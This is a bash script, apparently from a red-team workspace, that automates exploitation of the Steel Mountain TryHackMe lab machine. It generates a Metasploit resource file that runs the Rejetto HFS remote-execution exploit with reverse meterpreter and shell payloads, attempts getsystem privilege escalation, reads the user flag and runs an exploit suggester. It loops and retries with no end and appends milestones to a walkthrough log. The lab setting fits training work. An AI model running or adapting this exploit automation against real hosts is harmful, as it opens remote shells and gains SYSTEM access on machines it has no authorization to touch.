#!/usr/bin/env bash
set -u

TARGET="10.146.141.173"
BLOG="/home/kali/Redteam-Hermes/docs/walkthroughs/THM/steel-mountain-live.md"
LOGDIR="/home/kali/Redteam-Hermes/logs"
LOG="$LOGDIR/steel_mountain_worker.log"
STATE_DIR="$LOGDIR/steel_state"
mkdir -p "$LOGDIR" "$STATE_DIR"

TS() { date -u +"%Y-%m-%d %H:%M:%SZ"; }
log() { echo "[$(TS)] $*" | tee -a "$LOG"; }
blog_append() {
  {
    echo
    echo "### $(TS) — $1"
    shift
    for l in "$@"; do echo "$l"; done
  } >> "$BLOG"
}

get_attacker_ip() {
  local ip
  ip=$(ip -4 -o addr show dev tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  if [[ -z "$ip" ]]; then
    ip=$(ip -4 -o addr show dev tun1 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  fi
  echo "$ip"
}

target_up() {
  curl -sI --max-time 8 "http://$TARGET:8080" | grep -q "HTTP/1.1"
}

single_tunnel_ok() {
  local c
  c=$(ip -br a | awk '/^tun[0-9]+[[:space:]]+UP/{c++} END{print c+0}')
  [[ "$c" -eq 1 ]]
}

build_rc() {
  local lhost="$1"
  local lport="$2"
  local payload="$3"
  local runlog="$4"
  cat > /tmp/steel_mountain_hfs.rc <<EOF
spool $runlog
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS $TARGET
set RPORT 8080
set LHOST $lhost
set LPORT $lport
set payload $payload
run -j
sleep 16
sessions -l
sessions -i 1 -C "getuid"
sessions -i 2 -C "getuid"
sessions -i 3 -C "getuid"
sessions -i 1 -C "getsystem"
sessions -i 2 -C "getsystem"
sessions -i 3 -C "getsystem"
sessions -i 1 -C "sysinfo"
sessions -i 2 -C "sysinfo"
sessions -i 3 -C "sysinfo"
sessions -i 1 -C "shell -c whoami"
sessions -i 2 -C "shell -c whoami"
sessions -i 3 -C "shell -c whoami"
sessions -i 1 -C "shell -c whoami /priv"
sessions -i 2 -C "shell -c whoami /priv"
sessions -i 3 -C "shell -c whoami /priv"
sessions -i 1 -C "shell -c type C:\\Users\\bill\\Desktop\\user.txt"
sessions -i 2 -C "shell -c type C:\\Users\\bill\\Desktop\\user.txt"
sessions -i 3 -C "shell -c type C:\\Users\\bill\\Desktop\\user.txt"
sessions -i 1 -C "run post/multi/recon/local_exploit_suggester"
sessions -i 2 -C "run post/multi/recon/local_exploit_suggester"
sessions -i 3 -C "run post/multi/recon/local_exploit_suggester"
sessions -l
spool off
exit -y
EOF
}

attempt_once() {
  local lhost="$1"; local lport="$2"; local payload="$3"
  local runlog="$STATE_DIR/msf_${lport}_$(date +%s).log"

  build_rc "$lhost" "$lport" "$payload" "$runlog"
  msfconsole -q -r /tmp/steel_mountain_hfs.rc >> "$LOG" 2>&1 || true

  if grep -Eqi "Meterpreter session [0-9]+ opened|Command shell session [0-9]+ opened" "$runlog"; then
    log "foothold success payload=$payload lport=$lport"

    if grep -Eqi "(NT AUTHORITY\\SYSTEM|getsystem:.*success|got system|is_system:\s*true)" "$runlog"; then
      log "privesc success: SYSTEM observed in runlog"
      blog_append "Privilege escalation milestone" \
        "- Meterpreter foothold obtained and SYSTEM-level context observed in-session." \
        "- Evidence captured in worker logs under $runlog."
      touch "$STATE_DIR/system_observed"
      return 0
    fi

    log "foothold obtained but SYSTEM not yet confirmed"
    return 0
  fi

  return 1
}

log "worker supervisor start (foothold+privesc checks)"

while true; do
  if ! single_tunnel_ok; then
    log "blocked: tunnel count != 1; waiting"
    sleep 30
    continue
  fi

  ATTACKER_IP=$(get_attacker_ip)
  if [[ -z "$ATTACKER_IP" ]]; then
    log "blocked: no tun interface IP; retry in 45s"
    sleep 45
    continue
  fi

  if ! target_up; then
    log "target 8080 not reachable; retry in 45s"
    sleep 45
    continue
  fi

  log "starting attempt cycle from $ATTACKER_IP"
  nmap -Pn -n -p8080 -sV "$TARGET" >> "$LOG" 2>&1 || true

  success=0
  for lport in 4444 5555 9001; do
    for payload in windows/meterpreter/reverse_tcp windows/meterpreter/reverse_http windows/shell/reverse_tcp; do
      if attempt_once "$ATTACKER_IP" "$lport" "$payload"; then
        success=1
        break 2
      fi
      sleep 3
    done
  done

  if [[ "$success" -eq 0 ]]; then
    log "no foothold this cycle; backoff 90s"
    sleep 90
  else
    if [[ -f "$STATE_DIR/system_observed" ]]; then
      log "SYSTEM already observed; slowing loop"
      sleep 180
    else
      log "foothold present; continuing privesc attempts"
      sleep 60
    fi
  fi
done
